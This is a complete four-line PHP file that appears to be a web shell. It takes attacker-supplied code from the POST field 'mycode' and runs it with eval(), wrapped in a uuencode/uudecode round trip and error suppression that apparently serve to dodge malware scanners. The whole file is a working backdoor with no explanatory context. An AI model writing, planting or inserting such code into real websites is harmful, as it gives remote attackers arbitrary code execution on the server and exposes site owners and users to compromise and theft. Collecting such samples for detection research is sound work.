<?php
$AVuln = $_POST['mycode'];
@eval(@convert_uudecode(''.convert_uuencode($AVuln)));
?>